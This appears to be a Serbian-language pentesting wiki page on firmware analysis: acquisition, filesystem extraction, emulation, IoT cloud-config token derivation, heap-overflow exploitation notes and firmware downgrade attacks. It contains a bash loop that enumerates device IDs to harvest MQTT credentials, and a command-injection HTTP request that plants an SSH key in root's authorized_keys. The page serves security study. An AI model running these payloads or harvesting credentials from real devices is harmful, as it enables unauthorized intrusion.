# Analiza firmware-a

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware je ključni softver koji uređajima omogućava pravilan rad, upravljajući komunikacijom između hardverskih komponenti i softvera sa kojim korisnici komuniciraju i omogućavajući je. Skladišti se u trajnoj memoriji, čime se obezbeđuje da uređaj može da pristupi važnim instrukcijama od trenutka uključivanja, što dovodi do pokretanja operativnog sistema. Ispitivanje i potencijalna izmena firmware-a predstavljaju kritičan korak u identifikovanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je kritičan početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- CPU arhitekturi i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Hardverskom rasporedu i datasheet-ovima
- Metrikama codebase-a i lokacijama izvornog koda
- Eksternim bibliotekama i vrstama licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i identifikovanim ranjivostima

U tu svrhu, alati za **open-source intelligence (OSINT)** su od neprocenjive vrednosti, kao i analiza svih dostupnih komponenti open-source softvera kroz manuelne i automatizovane procese pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Nabavka firmware-a**

Firmware se može pribaviti na različite načine, pri čemu svaki ima sopstveni nivo složenosti:

- **Direktno** od izvora (developeri, proizvođači)
- **Izgradnjom** na osnovu dostavljenih uputstava
- **Preuzimanjem** sa zvaničnih support sajtova
- Korišćenjem **Google dork** upita za pronalaženje hostovanih firmware datoteka
- Direktnim pristupanjem **cloud storage-u**, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** pomoću man-in-the-middle tehnika
- **Ekstrakcijom** sa uređaja preko konekcija kao što su **UART**, **JTAG** ili **PICit**
- **Snifanjem** zahteva za ažuriranje unutar komunikacije uređaja
- Identifikovanjem i korišćenjem **hardkodovanih endpoint-a za ažuriranje**
- **Dumpovanjem** iz bootloader-a ili mreže
- **Uklanjanjem i čitanjem** memorijskog čipa, kada sve ostalo ne uspe, pomoću odgovarajućih hardverskih alata

### Logovi dostupni samo preko UART-a: forsiranje root shell-a putem U-Boot env-a u flash memoriji

Ako se UART RX ignoriše (dostupni su samo logovi), i dalje možete forsirati init shell tako što ćete offline **izmeniti U-Boot environment blob**:<sup>[[6]](#references)</sup>

1. Napravite dump SPI flash memorije pomoću SOIC-8 klipse i programatora (3.3 V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locirajte U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo upišite samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na embedded uređajima kod kojih je bootloader shell onemogućen, ali je env particija upisiva putem eksternog pristupa flash memoriji.

## Analiza firmware-a

Sada kada **imate firmware**, potrebno je da iz njega izdvojite informacije kako biste znali kako da mu pristupite. Za to možete koristiti različite alate:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropy** slike pomoću komande `binwalk -E <bin>`. Ako je entropy niska, verovatno nije enkriptovana. Ako je entropy visoka, verovatno je enkriptovana (ili na neki način kompresovana).

Pored toga, možete koristiti ove alate za ekstrakciju **fajlova ugrađenih u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za pregled fajla.

### Preuzimanje fajl sistema

Pomoću prethodno pomenutih alata, kao što je `binwalk -ev <bin>`, trebalo bi da budete u mogućnosti da **ekstrahujete fajl sistem**.\
Binwalk ga obično ekstrahuje unutar **foldera nazvanog prema tipu fajl sistema**, što je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručna ekstrakcija fajl sistema

Ponekad binwalk **neće imati magic byte fajl sistema u svojim potpisima**. U tim slučajevima, koristite binwalk da **pronađete offset fajl sistema i izdvojite kompresovani fajl sistem** iz binarnog fajla, a zatim ga **ručno ekstrahujte** u skladu sa njegovim tipom pomoću koraka u nastavku.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokrenite sledeću **dd komandu** za izdvajanje Squashfs sistema datoteka.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u gornjem primeru)

`$ unsquashfs dir.squashfs`

Datoteke će se nakon toga nalaziti u direktorijumu "`squashfs-root`".

- CPIO arhivske datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 filesystem-e

`$ jefferson rootfsfile.jffs2`

- Za ubifs filesystem-e sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware-a

Kada se firmware pribavi, neophodno je detaljno ga analizirati kako bi se razumele njegova struktura i potencijalne ranjivosti. Ovaj proces obuhvata korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz firmware image-a.

### Alati za početnu analizu

Dat je skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu u identifikovanju tipova datoteka, izdvajanju stringova, analizi binarnih podataka i razumevanju detalja particija i filesystem-a:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Da bi se procenio status enkripcije slike, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na nedostatak enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.

Za ekstrakciju **ugrađenih datoteka**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za inspekciju datoteka.

### Ekstrakcija datotečnog sistema

Pomoću `binwalk -ev <bin>` obično je moguće ekstraktovati datotečni sistem, često u direktorijum nazvan prema tipu datotečnog sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip datotečnog sistema zbog nedostajućih magic bytes, neophodna je ručna ekstrakcija. To podrazumeva korišćenje alata `binwalk` za pronalaženje offseta datotečnog sistema, nakon čega se pomoću komande `dd` datotečni sistem izdvaja:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Nakon toga, u zavisnosti od tipa filesystem-a (npr. squashfs, cpio, jffs2, ubifs), koriste se različite komande za ručno izdvajanje sadržaja.

### Analiza filesystem-a

Kada je filesystem izdvojen, počinje pretraga bezbednosnih propusta. Pažnja se posvećuje nesigurnim mrežnim daemonima, hardkodovanim kredencijalima, API endpointima, funkcionalnostima update servera, nekompajliranom kodu, startup skriptama i kompajliranim binarnim fajlovima za offline analizu.

**Ključne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** za korisničke kredencijale
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i skript fajlove radi pronalaženja potencijalnih ranjivosti
- Ugrađene binarne fajlove za dalju analizu
- Uobičajene web servere i binarne fajlove IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar filesystem-a:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih fajlova

Izvorni kod i kompajlirani binarni fajlovi pronađeni u filesystem-u moraju se detaljno ispitati zbog ranjivosti. Alati kao što su **checksec.sh** za Unix binarne fajlove i **PESecurity** za Windows binarne fajlove pomažu u identifikovanju nezaštićenih binarnih fajlova koji bi mogli biti iskorišćeni.

## Preuzimanje cloud konfiguracije i MQTT kredencijala pomoću izvedenih URL tokena

Mnogi IoT hubovi preuzimaju konfiguraciju specifičnu za uređaj sa cloud endpointa koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodovane tajne, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen kao heksadecimalna vrednost velikim slovima

Ovakav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, koja često otkriva MQTT kredencijale u čistom tekstu i prefikse topic-a.

Praktičan tok rada:

1) Izdvojite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i zabeležite logove:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Potražite linije koje ispisuju obrazac URL-a cloud config-a i adresu brokera, na primer:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Oporavite STATIC_KEY i algoritam tokena iz firmware-a

- Učitajte binarne fajlove u Ghidra/radare2 i pretražite putanju do konfiguracije ("/pf/") ili korišćenje MD5-a.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedite token u Bash-u i prebacite sažetak u velika slova:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Prikupljanje cloud konfiguracije i MQTT kredencijala

- Sastavite URL i preuzmite JSON pomoću curl; analizirajte ga pomoću jq da biste izdvojili secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Zloupotreba plaintext MQTT-a i slabih ACL-ova tema (ako postoje)

- Iskoristite pronađene credentials da se pretplatite na maintenance teme i potražite osetljive događaje:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Nabrojte predvidljive ID-jeve uređaja (u velikom obimu, uz odobrenje)

- Mnogi ekosistemi ugrađuju bajtove vendor OUI-ja/proizvoda/tipa, nakon kojih sledi sekvencijalni sufiks.
- Možete programski iterirati kroz kandidate za ID-jeve, izvoditi tokene i preuzimati konfiguracije:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek pribavite izričito ovlašćenje pre pokušaja masovne enumeracije.
- Kada je moguće, dajte prednost emulaciji ili static analysis pristupu za otkrivanje secrets bez menjanja ciljnog hardware-a.


Proces emulacije firmware-a omogućava **dynamic analysis** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove povezane sa zavisnostima od hardware-a ili architecture, ali prebacivanje root filesystem-a ili određenih binaries na uređaj sa odgovarajućom architecture i endianness vrednošću, kao što je Raspberry Pi, ili na unapred pripremljenu virtual machine, može olakšati dalje testiranje.

### Emulacija pojedinačnih binaries

Za ispitivanje pojedinačnih programa, od ključne je važnosti utvrditi endianness programa i CPU architecture.

#### Primer sa MIPS architecture

Za emulaciju binary-ja za MIPS architecture može se koristiti komanda:
```bash
file ./squashfs-root/bin/busybox
```
A da biste instalirali neophodne alate za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Za MIPS (big-endian) koristi se `qemu-mips`, dok bi za little-endian binarne datoteke izbor bio `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke proces je sličan, pri čemu se za emulaciju koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmware-a, automatizuju proces i pomažu u dinamičkoj analizi.

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi stvarno ili emulirano okruženje uređaja. Neophodno je zadržati shell pristup OS-u i fajl sistemu. Emulacija možda neće savršeno oponašati interakcije sa hardverom, zbog čega će povremeno biti potrebno ponovo pokrenuti emulaciju. Analiza treba ponovo da obuhvati fajl sistem, iskorišćavanje izloženih web stranica i mrežnih servisa, kao i istraživanje ranjivosti bootloader-a. Testovi integriteta firmware-a su ključni za identifikovanje potencijalnih backdoor ranjivosti.

## Tehnike runtime analize

Runtime analiza podrazumeva interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju, uz korišćenje alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoint-a i identifikovanje ranjivosti pomoću fuzzing-a i drugih tehnika.

Za embedded ciljeve bez potpunog debugger-a, **kopirajte statički linkovani `gdbserver`** na uređaj i povežite se udaljeno:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapiranje Zigbee / radio-co-processor poruka

Na IoT hubovima RF stack je često podeljen između **radio MCU-a** i Linux userland procesa. Koristan workflow je mapiranje putanje:<sup>[[8]](#references)</sup>

1. **RF frame** u etru
2. **controller-side parser** na radio MCU-u
3. **serial/UART text ili TLV protocol** prosleđen Linuxu (na primer `/dev/tty*`)
4. **application dispatcher** u glavnom daemonu
5. **protocol-specific handler / state machine**

Ova arhitektura stvara dva reversing cilja umesto jednog. Ako controller pretvara binarne radio frameove u tekstualni protocol kao što je `Group,Command,arg1,arg2,...`, pronađite:

- **message groups** i dispatch tabele
- Koje poruke mogu doći sa **network-a**, a koje generiše sam controller
- Tačna **manufacturer-specific discriminator polja** (na primer Zigbee `manufacturer_code` i custom `cluster_command`)
- Koji handleri su dostupni samo tokom **commissioning-a**, discovery-ja ili faza preuzimanja firmware/modela

Konkretno za Zigbee, snimite pairing saobraćaj i proverite da li se target i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, sniffing commissioning saobraćaja može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, zato zabeležite da li ih testirani uređaj zaista primenjuje.

### Manufacturer-specific protocol handleri i FSM-gated dostupnost

Vendor-specific Zigbee/ZCL komande često predstavljaju bolji target od standardizovanih klastera, jer prosleđuju podatke **custom parsing code-u** i internim **FSM-ovima** sa slabije testiranom validacijom.<sup>[[8]](#references)</sup>

Praktični workflow:

- Reverse-ujte command dispatcher dok ne pronađete **vendor-only handler**.
- Rekonstruišite tabele za **FSM state**, **event**, **check**, **action** i **next-state**.
- Identifikujte **transitional states** koji se automatski pomeraju napred, kao i retry/error grane koje na kraju resetuju ili oslobađaju state pod kontrolom napadača.
- Potvrdite koje su legitimne protocol razmene potrebne da bi se daemon doveo u ranjivo stanje, umesto da pretpostavite da je buggy handler uvek dostupan.

Kod protocol-a osetljivih na timing, replay paketa iz Python framework-a može biti prespor. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardveru (na primer **nRF52840**) uz vendor-grade stack, kako biste mogli da izložite odgovarajuće **endpoints**, **attributes** i commissioning timing.

### Klasa bugova fragmentiranog preuzimanja u embedded daemonima

Ponavljajuća klasa firmware bugova javlja se kod **fragmentiranih preuzimanja blob/model/configuration podataka**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) čuva `ctx->total_size` i poziva `malloc(total_size)`.
2. Naredni fragmenti proveravaju samo attacker-controlled **packet-local** polja, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere u odnosu na **originalnu alociranu veličinu**.

To omogućava napadaču da pošalje:

- Prvi validni fragment sa **malom** deklarisanom ukupnom veličinom, kako bi izazvao malu heap alokaciju.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Falsifikovanu packet-local veličinu koja zadovoljava sveže provere, dok i dalje izaziva overflow prvobitno alociranog buffer-a.

Kada se ranjivi path nalazi iza commissioning logike, exploitation mora da obuhvati dovoljno **device emulation-a** da target pre slanja neispravnih fragmenta uvede u očekivano stanje preuzimanja modela ili blob-a.

### Protocol-driven `free()` okidači

U embedded daemonima, najlakši način za aktiviranje heap metadata exploitation-a često nije „čekanje cleanup-a“, već **prisiljavanje sopstvenog error handling-a protocol-a**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne follow-up fragmente kako biste FSM pomerili u **retry** ili **error** stanja.
- Prekoračite retry threshold, tako da daemon **resetuje context** i oslobodi oštećeni buffer.
- Iskoristite ovaj predvidljivi `free()` za aktiviranje allocator-side primitives pre nego što se proces sruši iz nepovezanih razloga.

Ovo je naročito korisno protiv **musl/uClibc/dlmalloc-like** allocator-a u embedded Linuxu, gde korupcija chunk metadata-e može pretvoriti unlink/unbin logiku u write primitive. Stabilan obrazac je korupcija **size field-a** radi preusmeravanja allocator traversal-a u **fake chunks** postavljene unutar overflow-ovanog buffer-a, umesto trenutnog prepisivanja stvarnih bin pointer-a i rušenja procesa.

## Binary Exploitation i Proof-of-Concept

Razvoj PoC-a za identifikovane ranjivosti zahteva duboko razumevanje arhitekture targeta i programiranje u nižim programskim jezicima. Binary runtime zaštite su retke u embedded sistemima, ali kada postoje, tehnike kao što je Return Oriented Programming (ROP) mogu biti neophodne.

### Napomene o uClibc fastbin exploitation-u (embedded Linux)

- **Fastbins + consolidation:** uClibc koristi fastbins slične onima u glibc-u. Kasnija velika alokacija može pokrenuti `__malloc_consolidate()`, zato svaki fake chunk mora proći provere (`sane size`, `fd = 0` i okolni chunk-ovi moraju biti označeni kao „in use“).<sup>[[6]](#references)</sup>
- **Non-PIE binariji pod ASLR-om:** ako je ASLR omogućen, ali je glavni binary **non-PIE**, adrese unutar binarnog `.data/.bss` segmenta su stabilne. Možete targetirati region koji već liči na validan heap chunk header kako biste fastbin alokaciju usmerili na **function pointer table**.
- **Parser-stopping NUL:** kada se JSON parsira, `\x00` u payload-u može zaustaviti parsing, uz zadržavanje preostalih attacker-controlled bajtova za stack pivot/ROP chain.
- **Shellcode preko `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može postaviti executable shellcode u poznati mapping i skočiti na njega.

## Prepared Operating Systems za Firmware Analysis

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju prekonfigurisana okruženja za firmware security testing, opremljena neophodnim alatima.

## Prepared OSs za analizu Firmware-a

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen obavljanju security assessment-a i penetration testing-a Internet of Things (IoT) uređaja. Štedi vam mnogo vremena tako što pruža prekonfigurisano okruženje sa svim učitanim neophodnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za embedded security testing zasnovan na Ubuntu 18.04, sa unapred učitanim alatima za firmware security testing.

## Firmware Downgrade Attacks i Insecure Update Mechanisms

Čak i kada vendor implementira cryptographic signature provere za firmware image-ove, **zaštita od version rollback-a (downgrade-a) često izostaje**. Kada boot- ili recovery-loader proverava samo signature pomoću ugrađenog public key-a, ali ne poredi *version* (ili monotonic counter) image-a koji se flash-uje, napadač može legitimno instalirati **stariji, ranjivi firmware koji i dalje ima validan signature** i tako ponovo uvesti zakrpane ranjivosti.<sup>[[4]](#references)</sup>

Tipičan attack workflow:

1. **Nabavite stariji signed image**
* Preuzmite ga sa vendor-ovog javnog download portala, CDN-a ili support sajta.
* Extract-ujte ga iz pratećih mobile/desktop aplikacija (npr. unutar Android APK-a u `assets/firmware/`).
* Preuzmite ga iz third-party repository-ja kao što su VirusTotal, Internet archives, forumi itd.
2. **Upload-ujte ili poslužite image uređaju** preko bilo kog exposed update channel-a:
* Web UI, mobile-app API, USB, TFTP, MQTT itd.
* Mnogi consumer IoT uređaji izlažu *unauthenticated* HTTP(S) endpoint-e koji prihvataju Base64-encoded firmware blob-ove, dekodiraju ih server-side i pokreću recovery/upgrade.
3. Nakon downgrade-a, exploit-ujte ranjivost koja je zakrpljena u novijem release-u (na primer command-injection filter koji je dodat kasnije).
4. Opciono flash-ujte najnoviji image nazad ili onemogućite update-e da biste izbegli detekciju nakon dobijanja persistence-a.

### Primer: Command Injection nakon Downgrade-a
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivom (downgraded) firmware-u, parametar `md5` se direktno konkatenira u shell komandu bez sanitizacije, što omogućava injection proizvoljnih komandi (ovde – omogućavanje root pristupa zasnovanog na SSH ključu). Kasnije verzije firmware-a uvele su osnovni filter karaktera, ali odsustvo zaštite od downgrade-a čini ovu ispravku beskorisnom.<sup>[[4]](#references)</sup>

### Izdvajanje firmware-a iz mobilnih aplikacija

Mnogi vendori uključuju kompletne firmware image-e u svoje prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj putem Bluetooth-a/Wi-Fi-ja. Ovi paketi se obično čuvaju nešifrovani u APK/APEX datotekama, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju izdvajanje potpisanih image-a bez pristupa fizičkom hardveru.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass anti-rollback zaštite samo u updateru kod A/B slot dizajna

Neki vendors zaista implementiraju anti-downgrade **ratchet**, ali samo unutar logike *updatera* (na primer UDS rutine preko CAN-a, recovery komande ili userspace OTA agenta). Ako **bootloader** kasnije proverava samo potpis/CRC image-a i veruje partition table-u ili metadata podacima slota, rollback zaštita i dalje može da se zaobiđe.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Firmware metadata sadrži i deskriptor verzije i **security ratchet** / monotonički brojač.
- Updater poredi ratchet image-a sa vrednošću sačuvanom u persistent storage-u i odbija starije potpisane image-e.
- Bootloader ne parsira taj ratchet i samo proverava header, CRC i potpis pre bootovanja izabranog slota.
- Aktivacija slota čuva se odvojeno u partition table-u ili generation counter-u po slotu i nije kriptografski vezana za tačan digest firmware-a koji je validiran.

Ovo u dual-slot sistemima stvara primitivu **validate-one-image / boot-another-image**. Ako attacker može da natera updater da označi slot B kao sledeći boot target koristeći trenutno potpisan image, a zatim može da prepiše slot B pre reboot-a, bootloader i dalje može da bootuje downgraded image zato što veruje samo već upisanim slot metadata podacima.

Uobičajen obrazac zloupotrebe:

1. Uploadujte **trenutni potpisani** firmware u pasivni slot i pokrenite uobičajenu validation/switch rutinu tako da layout označi taj slot kao sledeći aktivni.
2. **Još nemojte izvršiti reboot**. Ponovo uđite u slot-preparation/erase rutinu u istoj sesiji.
3. Iskoristite zastarelo boot stanje ili zastarelu logiku izbora slota tako da updater obriše **isti fizički slot** koji je upravo promovisan.
4. Upišite **stariji, ali i dalje potpisan** firmware u taj slot.
5. Preskočite validation rutinu koja primenjuje ratchet i direktno izvršite reboot.
6. Bootloader bira promovisani slot, proverava samo potpis/integritet i bootuje stari image.

Stvari koje treba tražiti pri reverse engineering-u A/B update implementacija:

- Izbor slota izveden iz **boot-time flagova** koji se ne osvežavaju nakon uspešnog switch-a.
- Rutina u stilu `prepare_passive_slot()` koja briše slot na osnovu zastarelog stanja umesto **trenutnog committed layout-a**.
- Funkcija u stilu `part_write_layout()` koja samo uvećava **generation counter** / active flag i ne čuva hash validiranog image-a.
- Ratchet provere implementirane u userspace ili updater kodu, ali **ne** u ROM / bootloader / secure boot fazama.
- Erase ili recovery rutine koje ostavljaju slot označenim kao bootable čak i nakon što je njegov sadržaj uklonjen i ponovo upisan.

### Checklist za procenu update logike

* Da li su transport/authentication *update endpointa* adekvatno zaštićeni (TLS + authentication)?
* Da li uređaj pre flashovanja poredi **brojeve verzija** ili **monotonički anti-rollback counter**?
* Da li se image proverava unutar secure boot chain-a (npr. potpise proverava ROM kod)?
* Da li **bootloader primenjuje isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li su metadata podaci o aktivaciji slota **vezani za validirani digest/verziju firmware-a**, ili slot može da se izmeni nakon promocije?
* Nakon uspešnog switch-a slota, da li je uređaj primoran da izvrši reboot ili su kasnije update/erase rutine i dalje dostupne u istoj sesiji?
* Da li userland kod obavlja dodatne sanity provere (npr. dozvoljenu partition mapu, broj modela)?
* Da li *partial* ili *backup* update tokovi ponovo koriste istu validation logiku?

> 💡  Ako nešto od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Vulnerable firmware za vežbu

Za vežbanje otkrivanja ranjivosti u firmware-u, koristite sledeće vulnerable firmware projekte kao početnu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Oporavak ključeva za dešifrovanje firmware-a iz ugrađenog KMS/Vault stanja

Kada update image kombinuje male plaintext metadata podatke sa velikim blobom visoke entropije, prvo uradite container triage pre bilo kakvog brute-force pokušaja:<sup>[[1]](#references)</sup>

- Izbacite headere, offsete i granice linija pomoću `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava OpenSSL `enc` format: sledećih 8 bajtova predstavlja salt, a preostali bajtovi su ciphertext.
- Base64 polje koje se dekodira u tačno `256` bajtova snažan je pokazatelj da posmatrate RSA-2048 ciphertext koji obavija nasumičnu firmware lozinku/session key.
- Detached PGP materijal u istom fajlu često štiti samo authenticity; nemojte pretpostaviti da je to mehanizam confidentiality-ja.

Ako statičko traženje ključeva (`grep`, `strings`, PEM/PGP pretrage) ne uspe, reverse-ujte **operativni decrypt path** umesto da samo tražite private ključeve:

- Decompile-ujte updater / management binary i pratite ko čita encrypted blob, koji helper/API ga unwrap-uje i koje logičko ime ključa zahteva.
- Pretražite izdvojeni root filesystem za KMS stanje (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit fajlove i init skripte.
- Tretirajte plaintext `vault operator unseal ...`, recovery ključeve, bootstrap tokene ili lokalne KMS auto-unseal skripte kao ekvivalent private-key materijalu.

Ako appliance sadrži originalni Vault binary i storage backend, replay tog okruženja obično je lakši od ponovne implementacije Vault internih mehanizama:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

